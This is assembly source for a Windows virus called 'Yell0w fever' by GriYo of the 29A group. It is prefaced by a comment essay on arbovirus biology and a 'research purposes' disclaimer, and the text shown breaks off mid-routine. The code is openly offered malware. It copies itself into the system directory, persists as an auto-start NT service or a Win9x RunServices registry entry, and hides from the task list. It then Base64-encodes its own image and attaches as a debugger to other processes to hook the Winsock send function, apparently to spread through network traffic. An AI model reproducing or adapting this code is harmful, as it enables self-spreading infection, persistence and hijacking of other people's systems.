
;························································································································································
;
;    Yell0w fever BioCoded by GriYo / 29A
;
;    http://www.bi0.net
;    griyo@bi0.net
;
;   - About the bio-model:
;
;    Yellow fever probably emerged in the New World as a result of the
;    African slave trade, which brought Aedes aegypti in water containers of
;    ships. Similarly, the rise of Dengue hemorrhagic fever in Southeast Asia
;    in the late 1940s is attributed to rapid migration to cities with open
;    water storage, which favoured proliferation of the mosquito or other
;    suitable vectors. Of current concern in the USA is the fact that Aedes
;    albopictus, an aggressive and competent dengue virus vector, was
;    brought to Houston in used Asian tires and has established itself in at
;    least 17 American states (Morse and Schluederberg 1990).
;
;    Approximately 100 of the more than 520 known arthropod-borne viruses
;    (arboviruses) cause human disease. At least 20 of these might fulfill
;    the criteria for emerging viruses, appearing in epidemic form at
;    generally unpredictable intervals (Morse and Schluederberg 1990).
;    These viruses are usually spread by the bites of arthropods, but some
;    can also be transmitted by other means, for example through milk,
;    excreta or aerosols. The arbovirus infections are maintained in nature
;    principally, or to an important extent, through biological transmission
;    between susceptible vertebrate hosts by blood-sucking insects; they
;    multiply to produce viraemia in the vertebrates, multiply in the
;    tissues of the insects and are passed on to new vertebrates by the
;    bites of insects after a period of extrinsic incubation. The names by
;    which these viruses are known are often place names such as West Nile
;    or Rift Valley, or are based on clinical characteristics like yellow
;    fever.
;
;    The populations and characters of the vertebrate hosts and their
;    threshold levels of viraemia are important. Small rodents multiply
;    rapidly and have short lives, thus providing a constant supply of
;    susceptible individuals. In contrast, monkeys and pigs multiply slowly,
;    and once they have recovered from an infection, remain immune for life.
;    African monkeys are relatively resistant to Yellow Fever, but Asian and
;    American monkeys are susceptible, probably because, unlike the African
;    monkeys, they have not been exposed continuously for centuries to the
;    infection. Also, possibly related arboviruses may offer partial
;    immunization.
;
;    Arboviruses are grouped according to antigenic characters, but after
;    inoculation of one virus into a fresh animal, not only the homologous
;    antibodies, but also heterologous antibodies reacting with other viruses
;    of the same group tend to appear. Recovery from an infection by a 
;    member of one group of arboviruses may provide some degree of resistance
;    to a subsequent infection by another member of the same group. For 
;    example, infection with West Nile virus may have modified the Ethiopian
;    epidemic of Yellow Fever in 1962. Again, the effect of prior infection
;    with Zika, Uganda S and other related viruses in the forest belt of 
;    Nigeria, leading to a high incidence of related antibodies, is 
;    suggested as the explanation of the absence of epidemic Yellow Fever in
;    man in that area. These related infections probably modify the disease
;    rather than prevent infection.
;
;    With Yellow Fever, neutralizing antibodies can be found as early as a
;    few days after the beginning of the disease and are found constantly for
;    many years in the sera. The persistence of immunity does not depend on
;    exogenous reinfection. It is probable that a mosquito infected with 
;    Yellow Fever is not harmed by it, but continues to excrete the virus 
;    throughout life. This means a continuous supply and release of virus,
;    probably from the epithelial cells of the salivary glands. The virus 
;    enters man (or other animals) and gains the liver and other epithelia,
;    provoking the early antibodies in the blood, which neutralize 
;    circulating viruses. But, as suggested by Hunter (1991), antibodies
;    which can be detected for so many years in man must stem from a 
;    continuing stimulus, and the sensitive cells and their progeny probably
;    have a prophase equivalent of the virus incorporated into their genome,
;    with occasional reversion to productive development which provides the
;    stimulus for further antibody formation. A degree of immunity of this
;    kind may possibly be provided when a related virus invades epithelial
;    cells.
;
;    Infant rhesus monkeys and human infants born of mothers immune to
;    Yellow Fever have transient protective antibodies in their sera at
;    birth which persist for several months. They are probably placentally 
;    transferred, rather than coming from the mother's milk, because 
;    antibodies may disappear from infant sera while they are still suckling.
;    Passive immunity induced by injection of homologous immune serum, has 
;    been used for protection against tick-borne encephalitis in cases of 
;    special risk and similar sera could be used against other infections, 
;    particularly after laboratory or hospital accidents.
;
;    Alison Jacobson, Department of Microbiology
;    University of Cape Town
;
;   - Disclaimer:
;
;    This software has been written just for researching purposes.
;    The author is not responsible for any problems caused due to
;    improper or illegal use of it.
;
;Creditz:
;
;    As always, the instroduction is part from some documents written by
;    Alison Jacobson. A very interesting reading.
;
;    I added some code comments taken from several articles i found at MSDN.
;    Specially, i want to give mention to this one:
;
;        The Win32 Debugging Application Programming Interface
;        Randy Kath
;        Microsoft Developer Network Technology Group
;
;    I was long wondering how to get my service application access to
;    desktop windows. This article helped me:
;
;        Why Do Certain Win32 Technologies Misbehave in Windows NT Services?
;    Msdn
;
;    The CRC32 routine is a translation to assembler of a routine in C
;    written by Mark Adler
;
;    The rest of the code is mine, written with my girlfriend's invaluable
;    help and the support of my two RottWeillers
;
;    Have fun!
;
;························································································································································

                .386P
                locals
                    jumps
                .model flat,STDCALL

                include Win32api.inc
                include Useful.inc
                    include Mz.inc
                include Pe.inc

                extrn GetModuleHandleA:NEAR
                extrn GetProcAddress:NEAR

SIZEOF_VIRUS            equ 7992

SIZEOF_VIRUS_BASE64     equ ((SIZEOF_VIRUS/02h)*03h)+((SIZEOF_VIRUS/14h)*02h)+04h

;########################################################################################################################################################

_TEXT               segment dword use32 public 'CODE'

HostCode:           ;Create CRC32 lookup table

                call CreateCRC32Table

                ;Get KERNEL32 module handle

                push offset szKERNEL32DLL
                call GetModuleHandleA
                or eax,eax
                jz TerminateVirus

                mov dword ptr [hKERNEL32],eax

                ;Get KERNEL32.DLL api addresses

                mov ebx,eax
                mov ecx,NumKERNEL32
                mov esi,offset CrcApisKERNEL32
                mov edi,offset EpApisKERNEL32
                call get_APIs
                jecxz K32ApiSuccess

CriticalError:          jmp TerminateVirus

K32ApiSuccess:          ;Get system information

                call VirusGetSystemInfo
                or eax,eax
                jz TerminateVirus

                ;Load DLLs and locate functions

                call LoadDllsAndLocateFunctions
                or eax,eax
                jz TerminateVirus

                ;Is virus running as a system service or
                ;as normal application ?

                mov esi,offset Path_VirusCurrentFile
                mov edi,offset StringBuffer
                push edi
                call StringParser
                pop esi
                call GetStringCRC32
                push edx

                mov esi,offset Path_VirusSystemFile
                mov edi,offset StringBuffer
                push edi
                call StringParser
                pop esi
                call GetStringCRC32

                pop eax

                cmp eax,edx
                je VirusOnSystem

                ;Build virus image for this system

                push 00000001h  ;Fail if file already exist

                mov esi,offset Path_VirusSystemFile
                push esi
                mov eax,offset Path_VirusCurrentFile
                push eax
                call dword ptr [a_CopyFileA]
                or eax,eax
                jz TerminateVirus

                ;Running on Windows NT ?

                mov eax,dword ptr [system_version+00000010h]

                cmp eax,VER_PLATFORM_WIN32_NT
                jne ThenItHaveToBe9x

                ;****jmp ExecuteFileAtSystemDir

;························································································································································
;Windows NT & Windows 2000:
;
;Register viral service into SCM
;························································································································································

SC_MANAGER_CONNECT      equ 00000001h
SC_MANAGER_CREATE_SERVICE   equ 00000002h
SC_MANAGER_ENUMERATE_SERVICE    equ 00000004h
SC_MANAGER_LOCK         equ 00000008h
SC_MANAGER_QUERY_LOCK_STATUS    equ 00000010h
SC_MANAGER_MODIFY_BOOT_CONFIG   equ 00000020h

SERVICE_WIN32_OWN_PROCESS   equ 00000010h
SERVICE_WIN32_SHARE_PROCESS equ 00000020h
SERVICE_INTERACTIVE_PROCESS equ 00000100h

SERVICE_BOOT_START      equ 00000000h
SERVICE_SYSTEM_START        equ 00000001h
SERVICE_AUTO_START      equ 00000002h
SERVICE_DEMAND_START        equ 00000003h
SERVICE_DISABLED        equ 00000004h

SERVICE_ERROR_IGNORE        equ 00000000h
SERVICE_ERROR_NORMAL        equ 00000001h
SERVICE_ERROR_SEVERE        equ 00000002h
SERVICE_ERROR_CRITICAL      equ 00000003h

SERVICE_QUERY_CONFIG        equ 00000001h
SERVICE_CHANGE_CONFIG       equ 00000002h
SERVICE_QUERY_STATUS        equ 00000004h
SERVICE_ENUMERATE_DEPENDENTS    equ 00000008h
SERVICE_START           equ 00000010h
SERVICE_STOP            equ 00000020h
SERVICE_PAUSE_CONTINUE      equ 00000040h
SERVICE_INTERROGATE     equ 00000080h
SERVICE_USER_DEFINED_CONTROL    equ 00000100h

SERVICE_ALL_ACCESS      equ STANDARD_RIGHTS_REQUIRED     or     \
                                    SERVICE_QUERY_CONFIG         or     \
                                    SERVICE_CHANGE_CONFIG        or     \
                                    SERVICE_QUERY_STATUS         or     \
                                    SERVICE_ENUMERATE_DEPENDENTS or     \
                                    SERVICE_START                or     \
                                    SERVICE_STOP                 or     \
                                    SERVICE_PAUSE_CONTINUE       or     \
                                    SERVICE_INTERROGATE          or     \
                                    SERVICE_USER_DEFINED_CONTROL

                ;This function establishes a communication
                ;channel with the SCM on the machine
                ;specified by the lpMachineName parameter.
                ;
                ;Pass NULL to open the SCM on the local
                ;machine
                ;
                ;The lpDatabaseName parameter identifies
                ;which database to open
                ;
                ;You should always pass either
                ;SERVICES_ACTIVE_DATABASE or NULL for this
                ;parameter
                ;
                ;The dwDesiredAccess parameter tells the 
                ;function what you intend to do with the SCM
                ;database

                push SC_MANAGER_CREATE_SERVICE
                push 00000000h
                push 00000000h
                call dword ptr [a_OpenSCManagerA]

                ;OpenSCManager returns an SC_HANDLE that you
                ;pass to other functions to manipulate the
                ;SCM’s database

                mov dword ptr [hSCM],eax

                or eax,eax
                jz ExecuteFileAtSystemDir

                ;SCM database is open... Now try to open
                ;the viral service, just to check if it has
                ;been already registered

                push SERVICE_ALL_ACCESS

                mov edi,offset ViralServiceName
                push edi

                push eax
                call dword ptr [a_OpenServiceA]

                mov dword ptr [hViralService],eax

                or eax,eax
                jnz ViralServiceAlreadyRegistered

                ;By far the most common reason to manipulate
                ;the SCM database is to add a service
                ;
                ;To add a service, you must call
                ;OpenSCManager, specifying the 
                ;SC_MANAGER_CREATE_SERVICE access, then call
                ;CreateService
                ;
                ;eax = 00000000h

                push eax    ;lpPassword 
                push eax    ;lpServiceStartName     
                push eax    ;lpDependencies
                push eax    ;lpdwTagId
                push eax    ;lpLoadOrderGroup
                
                mov esi,offset Path_VirusSystemFile

                push esi    ;lpBinaryPathName
                
                push SERVICE_ERROR_NORMAL ;dwErrorControl
                push SERVICE_AUTO_START   ;dwStartType

                ;dwServiceType
                ;
                ;The SERVICE_INTERACTIVE_PROCESS flag enables
                ;a service application process to interact
                ;with the desktop

                push SERVICE_WIN32_SHARE_PROCESS or SERVICE_INTERACTIVE_PROCESS
                
                push SERVICE_ALL_ACCESS ;dwDesiredAccess 
                push eax        ;lpDisplayName
                push edi        ;lpServiceName

                push dword ptr [hSCM]   ;hSCManager 

                call dword ptr [a_CreateServiceA]

                mov dword ptr [hViralService],eax

                or eax,eax
                jz EndScmSession

                ;The StartService function starts a service
                ;Do you belive it ?

ViralServiceAlreadyRegistered:  push 00000000h
                push 00000000h
                push eax
                call dword ptr [a_StartServiceA]
                
                ;Close virus service handle

                push dword ptr [hViralService]
                call dword ptr [a_CloseServiceHandle]

                ;Close SCM handle

EndScmSession:          push dword ptr [hSCM]
                call dword ptr [a_CloseServiceHandle]

                jmp TerminateVirus

;························································································································································
;Windows 9x residency
;
;Register the virus application somewhere in WIN.INI or into registery (8-?
;························································································································································

KEY_WRITE           equ 00020006h
REG_SZ              equ 000000001h

ThenItHaveToBe9x:       ;If it isnt Win9x or WinNT then leave...

                cmp eax,VER_PLATFORM_WIN32_WINDOWS
                jne TerminateVirus

                ;Open *RunServices* registry key

                mov edi,offset hKey__RunServices
                push edi                
                push KEY_WRITE
                push 00000000h       ;REG_OPTION_NON_VOLATILE
                push offset szWin9xKeyName
                push 80000002h       ;HKEY_LOCAL_MACHINE

                call dword ptr [a_RegOpenKeyExA]
                or eax,eax
                jnz ExecuteFileAtSystemDir

                ;Size of path ?

                xor ecx,ecx
                mov edx,offset Path_VirusSystemFile
                mov esi,edx
                cld
GetSizeOfVirusPathLoop:     inc ecx
                lodsb
                or al,al
                jnz GetSizeOfVirusPathLoop

                ;Set key value

                push ecx        ;cbData
                push edx        ;lpData
                push REG_SZ     ;dwType
                push 00000000h      ;Reserved

                mov eax,offset ViralServiceName

                push eax        ;lpValueName 
                push dword ptr [edi]    ;hKey 

                call dword ptr [a_RegSetValueExA]

                ;Close the key

                push dword ptr [hKey__RunServices]
                call dword ptr [a_RegCloseKey]

;························································································································································
;Execute the file created at system directory
;Windows NT and Windows 2000 initialization should call this routine if
;service installation fails
;Windows 9x falls here after registry manipulation
;························································································································································

CREATE_NEW_PROCESS_GROUP    equ 00000200h

ExecuteFileAtSystemDir:     mov dword ptr [STARTUPINFO],00000044h
                xor eax,eax
                push offset PROCESS_INFORMATION     ;lpProcessInformation 
                push offset STARTUPINFO         ;lpStartupInfo 
                push eax                ;lpCurrentDirectory 
                push eax                ;lpEnvironment 
                push CREATE_NEW_PROCESS_GROUP       ;dwCreationFlags 
                push eax                ;bInheritHandles 
                push eax                ;lpThreadAttributes 
                push eax                ;lpProcessAttributes 
                push offset szCommandLine       ;lpCommandLine 
                push offset Path_VirusSystemFile    ;lpApplicationName 

                call dword ptr [a_CreateProcessA]

;························································································································································
;Dis is the end
;························································································································································

TerminateVirus:         ;Unload DLLs

                call UnloadDlls

                ;Bye bye

                push 00000000h
                call dword ptr [a_ExitProcess]

;························································································································································
;Initialization: Virus is on system file
;························································································································································

VirusOnSystem:          ;Running on Windows NT ?

                mov eax,dword ptr [system_version+00000010h]

                cmp eax,VER_PLATFORM_WIN32_NT
                jne ViralServiceRunningOnWin9x

;························································································································································
;Viral service running on Windows NT or Windows 2000
;························································································································································

                ;Check if we are running as a service or
                ;as a normal application

                call dword ptr [a_GetCommandLineA]
                mov esi,eax
                cld
ScanCommandLine:        lodsb
                or al,al
                jz RunningAsNtService
                cmp al,'/'
                jne ScanCommandLineNextChar

                cmp dword ptr [esi-00000001h],'A92/'
                jne ScanCommandLineNextChar

                ;We are running here as a normal user application

                call ServiceCommonPart
                jmp TerminateViralService

ScanCommandLineNextChar:    jmp ScanCommandLine

RunningAsNtService:     ;The StartServiceCtrlDispatcher function
                ;connects the main thread of a service 
                ;process to the service control manager, 
                ;which causes the thread to be the service 
                ;control dispatcher thread for the calling 
                ;process

                mov edi,offset ServiceTable

                push edi

                cld
                mov eax,offset ViralServiceName
                stosd
                mov eax,offset ViralServiceMain
                stosd
                xor eax,eax
                stosd
                stosd

                call dword ptr [a_StartServiceCtrlDispatcherA]

;························································································································································
;Terminate viral service
;························································································································································

TerminateViralService:      call UnloadDlls

                ;Terminate viral service

                push 00000000h
                call dword ptr [a_ExitProcess]

;························································································································································
;Viral service control dispatcher
;························································································································································

ViralServiceMain:       pushad

                ;A service application calls the
                ;RegisterServiceCtrlHandler function to 
                ;register a function to handle its service 
                ;control requests

                mov eax,offset ViralHandlerProc
                push eax
                mov eax,offset ViralServiceName
                push eax
                call dword ptr [a_RegisterServiceCtrlHandlerA]
                or eax,eax
                jz ExitServiceMain

                ;The SetServiceStatus function updates the
                ;service control manager's status information
                ;for the calling service
                ;
                ;Once a service is started, the service is
                ;given 82 seconds to register a handler and
                ;call SetServiceStatus for the first time

                push offset ServiceStatusStructure
                push eax
                call dword ptr [a_SetServiceStatus]
                or eax,eax
                jz ExitServiceMain              

                ;Launch debug thread

                call ServiceCommonPart

ExitServiceMain:        popad

                ; Thanks to z0mbi3 for pointing me out
                ; over this bug
                ;
                ; add esp,00000008h

                ret

;························································································································································
;Handle messages sent by system to viral service
;························································································································································

ViralHandlerProc:       add esp,00000004h
                ret

;························································································································································
;Viral service running on Windows 9x
;························································································································································

ViralServiceRunningOnWin9x: ;Hide virus application from task list,
                ;using RegisterServiceProcess

                mov ebx,dword ptr [hKERNEL32]
                mov ecx,00000001h
                mov esi,offset CRC__RegisterServiceProcess
                mov edi,offset a_RegisterServiceProcess
                call get_APIs
                jecxz OK_RSP

                jmp ERROR_RSP

OK_RSP:             push 00000001h
                call dword ptr [a_GetCurrentProcessId]
                push eax
                call dword ptr [a_RegisterServiceProcess]
                
ERROR_RSP:          ;Launch debug thread

                call ServiceCommonPart

                ;Terminate viral service

                jmp TerminateViralService

;························································································································································
;Viral service common part
;························································································································································

ServiceCommonPart:      ;Get CRC of WSOCK32.DLL file header

                mov eax,dword ptr [hWSOCK32]
                mov esi,dword ptr [eax+IMAGE_DOS_HEADER.MZ_lfanew]
                add esi,eax
                mov ecx,IMAGE_SIZEOF_FILE_HEADER
                call GetCRC32

                mov dword ptr [CRC__Winsock],edx

                ;Mutate virus to BASE64 only once

                xor edi,edi
                push edi
                push FILE_ATTRIBUTE_NORMAL
                push OPEN_EXISTING
                push edi
                push FILE_SHARE_READ
                push GENERIC_READ
                push offset Path_VirusSystemFile
                
                call dword ptr [a_CreateFileA]

                cmp eax,INVALID_HANDLE_VALUE
                je DEBUG__exit

                push eax

                push edi
                push edi
                push edi
                push PAGE_READONLY
                push edi
                push eax

                call dword ptr [a_CreateFileMappingA]

                or eax,eax
                jz DEBUG__closefile

                push eax

                push edi
                push edi
                push edi
                push FILE_MAP_READ
                push eax

                call dword ptr [a_MapViewOfFile]
                or eax,eax
                jz DEBUG__closemapping

                push eax
                mov esi,eax

                push PAGE_READWRITE
                push MEM_RESERVE or MEM_COMMIT
                push SIZEOF_VIRUS_BASE64
                push edi
            
                call dword ptr [a_VirtualAlloc]
                or eax,eax
                jz DEBUG__closeview
            
                mov dword ptr [BASE64__encoded],eax
                push eax
                mov ecx,SIZEOF_VIRUS_BASE64/02h
                mov edi,eax
                mov ax,0A0Dh
                rep stosw
                pop edi

                call BASE64encode

                call dword ptr [a_UnmapViewOfFile]
                call dword ptr [a_CloseHandle]
                call dword ptr [a_CloseHandle]

RepeatAgainAndAgain:        ;Initialize TargetProcessID and

                xor eax,eax
                mov dword ptr [TargetProcessID],eax

                ;Initialize thread list

                mov edi,offset ProcessThreadList
                mov ecx,SIZEOF_VIRUSPROCESSTHREADLIST*MAX_NUMBER_OF_THREADS
                cld
                rep stosb

                ;Create debug thread

                mov eax,offset DebugThreadID
                push eax
                xor ecx,ecx
                push ecx
                push ecx
                mov eax,offset DebugEventThread
                push eax
                push ecx
                push ecx

                call dword ptr [a_CreateThread]
                or eax,eax
                jz DEBUG__release
                
                ;Wait until thread terminates

                push 0FFFFFFFFh
                push eax
                call dword ptr [a_WaitForSingleObject]

                jmp RepeatAgainAndAgain

DEBUG__release:         push MEM_DECOMMIT or MEM_RELEASE
                push edi
                push dword ptr [BASE64__encoded]
                call dword ptr [a_VirtualFree]

                ret

DEBUG__closeview:       call dword ptr [a_UnmapViewOfFile]
DEBUG__closemapping:        call dword ptr [a_CloseHandle]
DEBUG__closefile:       call dword ptr [a_CloseHandle]
DEBUG__exit:            ret

;························································································································································
;DebugEventThread
;
;A debugger can attach to any existing process in the system, providing
;that it has the ID of that process. Through the DebugActiveProcess
;function, a debugger can establish the same parent/child relationship
;described earlier with active processes. In theory, then, the debugger
;should be able to present a list of active processes to the user, allowing
;them to select which one they would like to debug. Upon selection, the
;debugger could determine the ID of the selected process and begin debugging
;it by means of the DebugActiveProcess function. All that is needed then is
;a mechanism for enumerating the handles of each active process in the
;system. Unfortunately, NT provides no support for determining the ID of
;other processes in the system. While this seems to render the function
;useless, it really just limits the way it can be used. On its own, a
;debugger process cannot determine the ID of other active processes, but
;with some help from the system it can get the ID of a specific process in
;need of debugging.
;························································································································································

DebugEventThread:       ;Is the first time the thread is called?

                xor eax,eax
                cmp dword ptr [TargetProcessID],eax
                jne AlreadyUnderDebug

WaitForMemoryTarget:        ;Check for programs that are interesting
                ;for virus spreading
                ;
                ;The EnumWindows function will enumerate all
                ;the top-level windows and, for each window,
                ;do whatever you tell it to do

                push eax
                mov eax,offset EnumWndProc
                push eax
                call dword ptr [a_EnumWindows]

                push 00002710h
                call dword ptr [a_Sleep]

                xor eax,eax
                mov esi,dword ptr [TargetProcessID]

                cmp eax,esi
                je WaitForMemoryTarget

                push esi
                call dword ptr [a_DebugActiveProcess]
                or eax,eax
                jnz AlreadyUnderDebug

RetryWindowCatch:       mov dword ptr [TargetProcessID],eax
                jmp WaitForMemoryTarget

;························································································································································
;Debug event handler
;
;Two functions in Win32, WaitForDebugEvent and ContinueDebugEvent, are
;designed specifically for managing debug events as they occur in a process
;being debugged. These functions permit a debugger to wait for a debug event
;to occur, suspend execution of the process being debugged, process each 
;debug event, and resume execution of the process being debugged when
;finished. Additionally, while the process being debugged is suspended, the
;debugger is able to change the thread context information of each of its
;threads. This ability provides a mechanism through which the debugger can
;alter normal execution of one or more threads in the process being 
;debugged. It can, for example, change the instruction pointer for a thread
;to refer to an instruction at a new location. Then, when the thread resumes
;execution, it begins executing code at the new location. 
;
;When a debug event is generated, it comes to the debugger packaged in 
;a DEBUG_EVENT structure. The structure contains fields that represent an
;event code, the process ID of the process that generated the debug event,
;the thread ID of the thread executing when the debug event occurred, and
;a union of eight structures, one for each of the different events. 
;························································································································································

EXCEPTION_DEBUG_EVENT       equ 01h
CREATE_THREAD_DEBUG_EVENT   equ 02h
CREATE_PROCESS_DEBUG_EVENT  equ 03h
EXIT_THREAD_DEBUG_EVENT     equ 04h
EXIT_PROCESS_DEBUG_EVENT    equ 05h
LOAD_DLL_DEBUG_EVENT        equ 06h
UNLOAD_DLL_DEBUG_EVENT      equ 07h
OUTPUT_DEBUG_STRING_EVENT   equ 08h
RIP_EVENT           equ 09h

DBG_CONTINUE                    equ 00010002h
DBG_TERMINATE_THREAD            equ 40010003h 
DBG_TERMINATE_PROCESS           equ 40010004h 
DBG_CONTROL_C                   equ 40010005h 
DBG_CONTROL_BREAK               equ 40010008h 
DBG_EXCEPTION_NOT_HANDLED       equ 80010001h 

AlreadyUnderDebug:      ;The WaitForDebugEvent function waits for a
                ;debugging event to occur in a process being
                ;debugged

                push 0FFFFFFFFh
                mov esi,offset DebugEventInfo
                push esi
                call dword ptr [a_WaitForDebugEvent]
                or eax,eax
                jz ExitDebugThread
                        
                cld
                lodsd

                cmp eax,EXCEPTION_DEBUG_EVENT
                je HandleTargetException

                cmp eax,CREATE_THREAD_DEBUG_EVENT
                je HandleThreadCreation

                cmp eax,CREATE_PROCESS_DEBUG_EVENT
                je HandleProcessCreation

                cmp eax,EXIT_THREAD_DEBUG_EVENT
                je HandleThreadDestruction

                cmp eax,EXIT_PROCESS_DEBUG_EVENT
                je HandleProcessDestruction

                cmp eax,LOAD_DLL_DEBUG_EVENT
                jne ContinueDebug

                call HookApiProvider

ContinueDebug:          mov ecx,DBG_CONTINUE

Go4NewDebugEvent:       mov esi,offset DebugEventInfo+00000004h
                cld
                lodsd
                mov edx,eax
                lodsd

                push ecx
                push eax
                push edx
                call dword ptr [a_ContinueDebugEvent]

                jmp AlreadyUnderDebug

;························································································································································
;Handle PROCESS CREATION
;
;Save each ThreadId/hThread pair on a list
;
;On entry:  esi <- Ptr to debug event structure
;························································································································································

                ;Declaration of a debug event that notifies
                ;of process creation on target process

DEBUG_EVENT__CREATE_PROCESS struc

DECP_dwProcessId        dd ?
DECP_dwThreadId         dd ?

DECP_hFile          dd ? 
DECP_hProcess           dd ?
DECP_hThread            dd ?
DECP_lpBaseOfImage      dd ?
DECP_dwDebugInfoFileOffset  dd ?
DECP_nDebugInfoSize     dd ?
DECP_lpThreadLocalBase      dd ?
DECP_lpStartAddress     dd ?
DECP_lpImageName        dd ?
DECP_fUnicode           dw ?

DEBUG_EVENT__CREATE_PROCESS ends

STANDARD_RIGHTS_REQUIRED        equ 000F0000h
SYNCHRONIZE                     equ 00100000h

PROCESS_ALL_ACCESS      equ STANDARD_RIGHTS_REQUIRED or     \
                    SYNCHRONIZE or              \
                    00000FFFh

;························································································································································

HandleProcessCreation:      cld
                lodsd   ;dwProcessId

                add esi,00000008h ;Move to hProcess

                or eax,eax
                jz SkipTargetCreation
                cmp eax,dword ptr [TargetProcessID]
                jne SkipTargetCreation

                xor ecx,ecx
                push ecx
                push ecx
                push PROCESS_ALL_ACCESS

                mov edi,offset hTargetProcess
                push edi

                call dword ptr [a_GetCurrentProcess]
                push eax
                push dword ptr [esi]
                push eax

                call dword ptr [a_DuplicateHandle]
                or eax,eax
                jz DebugCreateProcInvalidHandle

SkipTargetCreation:     cld
                lodsd       ;hProcess
                lodsd       ;hThread
                or eax,eax
                jz DebugCreateProcInvalidHandle

                mov edx,eax

                call AddThread

DebugCreateProcInvalidHandle:   jmp ContinueDebug

;························································································································································
;Handle PROCESS DESTRUCTION
;
;Delete ThreadId/hThread pair from the list
;························································································································································

                ;Declaration of a debug event that notifies
                ;of process destruction on target process

DEBUG_EVENT__EXIT_PROCESS   struc

DEEP_dwProcessId        dd ?
DEEP_dwThreadId         dd ?

DEEP_dwExitCode         dd ?

DEBUG_EVENT__EXIT_PROCESS   ends

;························································································································································

HandleProcessDestruction:   call DeleteThread

                ;****cmp eax,dword ptr [ProcessThreadList+00000004h]
                ;****jne ContinueDebug

ExitDebugThread:        push 00000000h
                call dword ptr [a_ExitThread]

;························································································································································
;Handle THREAD CREATION
;
;Save ThreadId/hThread pair on a list
;························································································································································

                ;Declaration of a debug event that notifies
                ;of thread creation on target process

DEBUG_EVENT__CREATE_THREAD  struc

DECT_dwProcessId        dd ?
DECT_dwThreadId         dd ?

DECT_hThread            dd ?
DECT_lpThreadLocalBase      dd ?
DECT_lpStartAddress     dd ?

DEBUG_EVENT__CREATE_THREAD  ends

;························································································································································

HandleThreadCreation:       mov edx,dword ptr [esi+DEBUG_EVENT__CREATE_THREAD.DECT_hThread]

                or edx,edx
                jz DebugCreateThreadInvalidHandle

                call AddThread

DebugCreateThreadInvalidHandle: jmp ContinueDebug

;························································································································································
;Handle THREAD DESTRUCTION
;
;Delete ThreadId/hThread pair from the list
;························································································································································

                ;Declaration of a debug event that notifies
                ;of thread destruction on target process

DEBUG_EVENT__EXIT_THREAD    struc

DEET_dwProcessId        dd ?
DEET_dwThreadId         dd ?

DEET_dwExitCode         dd ?

DEBUG_EVENT__EXIT_THREAD    ends

;························································································································································

HandleThreadDestruction:    call DeleteThread
                jmp ContinueDebug

;························································································································································
;Add thread handle to the list
;
;On entry:  edx <- Thread handle
;
;On exit:
;························································································································································

THREAD_TERMINATE        equ 00000001h
THREAD_SUSPEND_RESUME       equ 00000002h
THREAD_GET_CONTEXT      equ 00000008h
THREAD_SET_CONTEXT      equ 00000010h
THREAD_SET_INFORMATION      equ 00000020h
THREAD_QUERY_INFORMATION    equ 00000040h
THREAD_SET_THREAD_TOKEN     equ 00000080h
THREAD_IMPERSONATE      equ 00000100h
THREAD_DIRECT_IMPERSONATION equ 00000200h

THREAD_ALL_ACCESS       equ STANDARD_RIGHTS_REQUIRED or     \
                    SYNCHRONIZE or              \
                    000003FFh

AddThread:          mov esi,offset ProcessThreadList
                mov edi,offset DebugEventInfo+00000008h

                mov ecx,MAX_NUMBER_OF_THREADS
                cld
SearchForFreePairOnProcess: lodsd
                or eax,eax
                jz FoundFreePair
                lodsd
                loop SearchForFreePairOnProcess
                ret

FoundFreePair:          xchg esi,edi
                sub edi,00000004h
                movsd           ;Copy dwThreadId

                mov esi,edx

                xor eax,eax
                push 00000000h
                push 00000001h
                push    THREAD_TERMINATE or         \
                    THREAD_SUSPEND_RESUME or        \
                    THREAD_GET_CONTEXT or           \
                    THREAD_SET_CONTEXT or           \
                    THREAD_SET_INFORMATION or       \
                    THREAD_QUERY_INFORMATION or     \
                    STANDARD_RIGHTS_REQUIRED or     \
                    SYNCHRONIZE

                push edi

                call dword ptr [a_GetCurrentProcess]
                push eax
                
                push esi
                push eax

                call dword ptr [a_DuplicateHandle]
                or eax,eax
                jnz HandleDuplicateSucess

                sub edi,00000004h
                cld
                stosd
                stosd

HandleDuplicateSucess:      ret

;························································································································································
;Delete thread handle from the list
;
;On entry:
;
;On exit:   eax -> Handle of deleted thread or NULL if error
;························································································································································

DeleteThread:           mov edx,dword ptr [DebugEventInfo+00000008h]
                or edx,edx
                jz ThreadIdNotFoundOnList

                call GetThreadHandleFromThreadId
                or eax,eax
                jz ThreadIdNotFoundOnList

                push eax

                push eax
                call dword ptr [a_CloseHandle]
                                
                mov edi,esi
                xor eax,eax
                cld
                stosd       ;Delete table entrie
                stosd

                pop eax

ThreadIdNotFoundOnList:     ret

;························································································································································
;Get thread handle from thread id
;
;On entry:  edx <- ThreadId
;
;On exit:   eax -> hThread or NULL if not found
;       esi -> Ptr to VirusProcessThreadList entrie
;························································································································································

GetThreadHandleFromThreadId:    push ecx
                mov esi,offset ProcessThreadList
                mov ecx,MAX_NUMBER_OF_THREADS
                cld
SearchForThreadId:      lodsd
                cmp eax,edx
                jne NotThisThreadId
                lodsd
                sub esi,00000008h
                jmp short ThreadIdFound
NotThisThreadId:        lodsd
                loop SearchForThreadId
                mov eax,ecx
ThreadIdFound:          pop ecx
                ret

;························································································································································
;Handle EXCEPTION debug event
;························································································································································

                ;Declaration of a debug event that notifies
                ;of a exception on target process

DEBUG_EVENT__EXCEPTION      struc

DEE_dwProcessId         dd ?
DEE_dwThreadId          dd ?

DEE_ExceptionRecord     EXCEPTION_RECORD ?
DEE_dwFirstChance       dd ?

DEBUG_EVENT__EXCEPTION      ends

SINGLE_STEP         equ 00000100h

;························································································································································

HandleTargetException:      mov eax,dword ptr [esi+DEBUG_EVENT__EXCEPTION.DEE_ExceptionRecord]

                ;Inside single-step?

                cmp eax,EXCEPTION_SINGLE_STEP
                je DoSingleStep

                ;Break-point exception?

                cmp eax,EXCEPTION_BREAKPOINT
                je DoBreakPoint

SkipException:          mov ecx,DBG_EXCEPTION_NOT_HANDLED
                jmp Go4NewDebugEvent

;························································································································································

DoSingleStep:           ;Re-patch api

                mov edi,dword ptr [a_send]
                call SetBreakPointOnAPI
                or eax,eax
                jz ExitSingleStep

                ;Get thread handle from current thread id
                ;on target process

                mov edx,dword ptr [DebugEventInfo+00000008h]

                call GetThreadHandleFromThreadId
                or eax,eax
                jz ExitSingleStep

                mov esi,eax

                call PrepareContext

                push edi
                push esi
                call dword ptr [a_GetThreadContext]

                or eax,eax
                jz ExitSingleStep

                ;Stop SINGLE-STEP mode

                and dword ptr [edi+CONTEXT.CONTEXT_EFlags],not SINGLE_STEP

                push edi
                push esi
